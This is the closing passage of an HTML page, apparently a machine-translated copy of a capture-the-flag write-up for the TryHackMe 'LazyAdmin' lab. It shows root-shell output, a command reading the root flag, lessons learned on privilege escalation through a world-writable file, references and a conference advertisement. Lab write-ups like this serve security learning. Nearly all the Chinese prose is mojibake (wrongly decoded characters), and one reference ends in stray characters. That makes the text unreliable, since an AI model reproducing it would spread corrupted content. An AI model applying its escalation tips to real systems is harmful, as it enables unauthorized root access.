iv"># id</strong><br/>uid=0(root) gid=0(root) groups=0(root)<br/><strong class="mu iv"># cat /root/root.txt # &lt;- the root flag</strong><br/><em class="nj">[redacted]</em></span></pre><h1 id="a96d" class="lc ld iu bd le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz bi translated">æ‘˜è¦</h1><p id="ab63" class="pw-post-body-paragraph jr js iu jt b ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk mq km kn ko in bi translated">å°½ç®¡æœ‰è¿™ä¸ªåå­—ï¼Œä½†åœ¨è¿™é‡Œè®¾è®¡æ——å¸œéœ€è¦çš„æŠ€å·§æ¯”æˆ‘å‡†å¤‡å¥½çš„è¦å¤šä¸€äº›ã€‚æˆ‘éœ€è¦<a class="ae kp" href="https://muirlandoracle.co.uk/2020/01/11/lazyadmin-write-up/" rel="noopener ugc nofollow" target="_blank">ã€Šç©†å…°é“å°”ã€‹(2020) </a>çš„å¸®åŠ©ï¼Œæˆ‘éœ€è¦æ›´å¤šçš„ç»ƒä¹ æ‰èƒ½æå‡åˆ°ç²¾è‹±é»‘å®¢çš„åœ°ä½ã€‚</p><p id="ec50" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">åŒæ ·å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæœ€è¿‘ï¼Œ<a class="ae kp" href="https://www.hackthebox.com/blog/It-is-Okay-to-Use-Writeups" rel="noopener ugc nofollow" target="_blank">â€œippsecâ€å’Œâ€œ0x dfâ€(2022)</a>æå‡ºï¼Œåƒæˆ‘è¿™æ ·çš„åˆå­¦è€…ï¼Œå¦‚æœä»–ä»¬çœŸçš„å¾ˆéš¾ä¾µå…¥æ¨¡æ‹Ÿè®¡ç®—æœºæˆ–ç½‘ç»œï¼Œå¯ä»¥å‚è€ƒæ–‡çŒ®ã€‚æˆ‘æƒ³è¡¥å……ä¸€ç‚¹ï¼Œåœ¨å†™æ–‡ç« ä¹‹å‰ï¼Œä½ åº”è¯¥å…ˆè¯•ç€è‡ªå·±é»‘ä¸€ä¸ªç”µè„‘ç³»ç»Ÿã€‚æ­¤å¤–ï¼Œå¦‚æœä½ å†³å®šå†™è‡ªå·±çš„æŠ¥å‘Šï¼Œä¸€å®šè¦åœ¨è¯¥è¡¨æ‰¬çš„åœ°æ–¹ç»™äºˆè¡¨æ‰¬ï¼›-)</p><h2 id="38c8" class="ma ld iu bd le mb mc dn li md me dp lm kc mf mg lq kg mh mi lu kk mj mk ly ml bi translated">å¸å–çš„æ•™è®­</h2><ul class=""><li id="3fd8" class="nk nl iu jt b ju mm jy mn kc ny kg nz kk oa ko np nq nr ns bi translated">æ¼æ´åˆ©ç”¨æœ‰æ—¶ä¼šä¸­æ–­ï¼Œæ‰€ä»¥ä¸€å®šè¦æœ‰ç¼–ç å’Œè°ƒè¯•èƒŒæ™¯æ¥ä¿®å¤å®ƒä»¬ï¼›-)</li><li id="0fc4" class="nk nl iu jt b ju nt jy nu kc nv kg nw kk nx ko np nq nr ns bi translated">åœ¨æ²¡æœ‰<code class="fe mr ms mt mu b">nano</code>ã€<code class="fe mr ms mt mu b">vim</code>æˆ–å…¶ä»–åŸºäºç»ˆç«¯çš„æ–‡æœ¬ç¼–è¾‘å™¨çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨<code class="fe mr ms mt mu b">echo</code>è¦†ç›–å…·æœ‰<code class="fe mr ms mt mu b">a+rwx</code>æ–‡ä»¶æƒé™çš„æ–‡ä»¶ã€‚</li><li id="483a" class="nk nl iu jt b ju nt jy nu kc nv kg nw kk nx ko np nq nr ns bi translated">äººä»¬ä¸åº”è¯¥è¿‡åˆ†ä¾èµ–Linuxæ™ºèƒ½æšä¸¾(<a class="ae kp" href="https://github.com/diego-treitos/linux-smart-enumeration" rel="noopener ugc nofollow" target="_blank"> Blancoï¼Œn.d. </a>)æˆ–<em class="nj"> Linuxæ¼æ´åˆ©ç”¨å»ºè®®è€…</em>(<a class="ae kp" href="https://github.com/mzet-/linux-exploit-suggester" rel="noopener ugc nofollow" target="_blank">â€œmzetâ€ï¼Œn.d. </a>)ã€‚å› ä¸ºæœ‰æ—¶ç›®å½•æƒé™å¯èƒ½éå¸¸ä¸¥æ ¼ã€‚</li><li id="9a08" class="nk nl iu jt b ju nt jy nu kc nv kg nw kk nx ko np nq nr ns bi translated">ä¸è¦ä½ä¼°â€œæ‡’æƒ°â€çš„ç³»ç»Ÿç®¡ç†å‘˜ï¼Œå°½ç®¡ä»–ä»¬å¾ˆæ‡’ï¼Œä½†ä»ç„¶å¾ˆéš¾å·¥ä½œã€‚</li></ul><h1 id="3b39" class="lc ld iu bd le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz bi translated">å¼•ç”¨çš„ä½œå“</h1><p id="327f" class="pw-post-body-paragraph jr js iu jt b ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk mq km kn ko in bi translated">å¸ƒå…°ç§‘åšå£«ã€‚<em class="nj"> Linuxæ™ºèƒ½æšä¸¾:ç”¨äºpentestingå’ŒCTFçš„Linuxæšä¸¾å·¥å…·ï¼Œå…·æœ‰è¯¦ç»†çº§åˆ«</em>ã€‚GitHubã€‚2022å¹´2æœˆ7æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://github.com/diego-treitos/linux-smart-enumeration" rel="noopener ugc nofollow" target="_blank">https://github.com/diego-treitos/linux-smart-enumeration</a></p><p id="d7da" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">è£‚è§£ç«™(æœªæ ‡æ˜)ã€‚2022å¹´2æœˆ7æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://crackstation.net/" rel="noopener ugc nofollow" target="_blank">https://crackstation.net/</a></p><p id="ebdf" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">â€œippsecâ€å’Œâ€œ0x dfâ€(2022)ã€‚ä½¿ç”¨ä¹¦é¢ææ–™æ˜¯å¯ä»¥çš„ã€‚é»‘ç›’å­ã€‚2022å¹´2æœˆ7æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://www.hackthebox.com/blog/It-is-Okay-to-Use-Writeups" rel="noopener ugc nofollow" target="_blank">https://www.hackthebox.com/blog/It-is-Okay-to-Use-Writeups</a></p><p id="43d2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">â€œMrs eth 6797â€(2019)ã€‚æ‹‰æ‰å¾·æ˜ã€‚TryHackMeã€‚2022å¹´2æœˆ7æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://www.tryhackme.com/room/lazyadmin" rel="noopener ugc nofollow" target="_blank">https://www.tryhackme.com/room/lazyadmin</a></p><p id="ed1f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">ã€Šç©†å…°é“å°”ã€‹(2020)ã€‚<em class="nj"> LazyAdmin â€”å‘ä¸Šå†™</em>ã€‚2022å¹´2æœˆ7æ—¥æ£€ç´¢è‡ª:<a class="ae kp" href="https://muirlandoracle.co.uk/2020/01/11/lazyadmin-write-up/" rel="noopener ugc nofollow" target="_blank">https://muirlandoracle.co.uk/2020/01/11/lazyadmin-write-up/</a></p><p id="0431" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">â€œmzetâ€(æœªæ³¨æ˜)ã€‚<em class="nj"> Linuxæƒé™æå‡å®¡è®¡å·¥å…·</em>ã€‚GitHubã€‚2022å¹´2æœˆ7æ—¥æ£€ç´¢è‡ª:ã€https://github.com/mzet-/linux-exploit-suggester T2ã€‘</p></div><div class="ab cl ob oc hy od" role="separator"><span class="oe bw bk of og oh"/><span class="oe bw bk of og oh"/><span class="oe bw bk of og"/></div><div class="in io ip iq ir"><h1 id="5064" class="lc ld iu bd le lf oi lh li lj oj ll lm ln ok lp lq lr ol lt lu lv om lx ly lz bi translated">ğŸ”ˆ ğŸ”ˆInfosec Writeupsæ­£åœ¨ç»„ç»‡å…¶é¦–æ¬¡è™šæ‹Ÿä¼šè®®å’Œç½‘ç»œæ´»åŠ¨ã€‚å¦‚æœä½ å¯¹ä¿¡æ¯å®‰å…¨æ„Ÿå…´è¶£ï¼Œè¿™æ˜¯æœ€é…·çš„åœ°æ–¹ï¼Œæœ‰16ä¸ªä»¤äººéš¾ä»¥ç½®ä¿¡çš„æ¼”è®²è€…å’Œ10å¤šä¸ªå°æ—¶å……æ»¡åŠ›é‡çš„è®¨è®ºä¼šè®®ã€‚<a class="ae kp" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank">æŸ¥çœ‹æ›´å¤šè¯¦æƒ…å¹¶åœ¨æ­¤æ³¨å†Œã€‚</a></h1><div class="on oo gq gs op oq"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="or ab fp"><div class="os ab ot cl cj ou"><h2 class="bd iv gz z fq ov fs ft ow fv fx it bi translated">IWCon2022 - Infosecä¹¦é¢æŠ¥å‘Šè™šæ‹Ÿä¼šè®®</h2><div class="ox l"><h3 class="bd b gz z fq ov fs ft ow fv fx dk translated">ä¸ä¸–ç•Œä¸Šæœ€ä¼˜ç§€çš„ä¿¡æ¯å®‰å…¨ä¸“å®¶å»ºç«‹è”ç³»ã€‚äº†è§£ç½‘ç»œå®‰å…¨ä¸“å®¶å¦‚ä½•å–å¾—æˆåŠŸã€‚å°†æ–°æŠ€èƒ½æ·»åŠ åˆ°æ‚¨çš„â€¦</h3></div><div class="oy l"><p class="bd b dl z fq ov fs ft ow fv fx dk translated">iwcon.live</p></div></div><div class="oz l"><div class="pa l pb pc pd oz pe kw oq"/></div></div></a></div></div></div>    
</body>
</html>